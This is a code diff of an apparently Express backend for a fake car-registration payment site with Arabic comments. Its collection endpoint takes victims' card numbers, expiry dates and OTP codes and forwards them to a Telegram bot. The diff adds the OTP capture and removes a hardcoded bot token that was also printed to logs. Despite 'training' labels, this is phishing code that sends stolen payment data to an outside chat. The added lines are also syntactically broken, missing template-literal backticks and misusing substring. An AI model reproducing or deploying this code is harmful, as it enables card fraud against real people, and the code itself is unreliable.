@@ -7,15 +7,8 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
-// Hardcoded Bot Parameters
-const BOT_TOKEN = process.env.BOT_TOKEN || '7856906286:AAFbx_K_V2qMxD_UxBc9LqKN_Q8vvKf_o2A';
-const CHAT_ID = process.env.CHAT_ID || '6286341877';
-
-console.log('[v0] Server Starting...');
-console.log('[v0] BOT_TOKEN configured:', !!BOT_TOKEN);
-console.log('[v0] CHAT_ID configured:', !!CHAT_ID);
-console.log('[v0] BOT_TOKEN:', BOT_TOKEN);
-console.log('[v0] CHAT_ID:', CHAT_ID);
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 // قاعدة بيانات وهمية للسيارات
 const fakeCars = {
@@ -25,45 +18,39 @@ const fakeCars = {
   "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021", carburant: "Essence" }
 };
 
+// نقطة الاستقبال الرئيسية للبيانات
 app.post('/api/collect', async (req, res) => {
   try {
     const { step, data } = req.body;
     
-    let message = '';
+    let message = 📊 منصة تدريبية - خطوة: ${step}\n;
     
-    if (step === 'payment') {
-      message = `📋 دفع جديد تم\n`;
-      message += `━━━━━━━━━━━\n`;
-      message += `🏷️ رقم التسجيل: ${data.plaque}\n`;
-      message += `🚗 الماركة: ${data.marque}\n`;
-      message += `💳 البطاقة: ****${data.cardLastFour}\n`;
-      message += `📅 الانتهاء: ${data.expiry}\n`;
-      message += `🕒 الوقت: ${data.timestamp}\n`;
-      message += `━━━━━━━━━━━`;
-    } else {
-      message = `منصة تدريبية\nالخطوة: ${step}`;
+    if (step === 'search_car') {
+      message += 🔍 البحث عن سيارة: ${data.plaque}\n✅ تم العثور على: ${data.marque} ${data.modele} (${data.annee});
+    }
+    else if (step === 'payment') {
+      message += 💳 محاولة دفع تدريبية\n;
+      message += 💳 رقم البطاقة: ${data.cardNumber?.substring(0, 4)}****${data.cardNumber?.substring(-4)}\n;
+      message += 📅 تاريخ: ${data.expiry}\n;
+    }
+    else if (step === 'otp') {
+      message += 🔐 إدخال رمز OTP تدريبي: ${data.code}\n✅ تم التحقق (وهمي);
+    }
+    else if (step === 'final') {
+      message += ✅ اكتملت العملية التدريبية بنجاح\n🚗 السيارة: ${data.marque} ${data.modele}\n📅 السنة: ${data.annee}\n💰 المبلغ: ${data.amount} دج (وهمي);
     }
     
-    console.log('[v0] Processing payment notification');
-    console.log('[v0] Telegram Config - Token:', BOT_TOKEN.substring(0, 10) + '...', 'Chat:', CHAT_ID);
+    message += \n🕒 ${new Date().toLocaleString('ar-DZ')};
     
-    if (BOT_TOKEN && CHAT_ID) {
-      try {
-        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'HTML'
-        });
-        console.log('[v0] Telegram sent:', response.status);
-      } catch (err) {
-        console.error('[v0] Telegram failed:', err.response?.status, err.message);
-      }
-    }
+    await axios.post(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+      chat_id: CHAT_ID,
+      text: message
+    });
     
     res.json({ success: true });
   } catch (error) {
-    console.error('[v0] Error:', error.message);
-    res.status(500).json({ error: error.message });
+    console.error('خطأ:', error.message);
+    res.status(500).json({ success: false });
   }
 });
 
@@ -82,4 +69,4 @@ app.post('/api/search-car', (req, res) => {
 const port = process.env.PORT || 3000;
 // هذا التصدير ضروري لـ Vercel
 export default app;
-app.listen(port, () => console.log(`✅ خادم المنصة يعمل على المنفذ ${port}`));
+app.listen(port, () => console.log(✅ خادم المنصة يعمل على المنفذ ${port}));
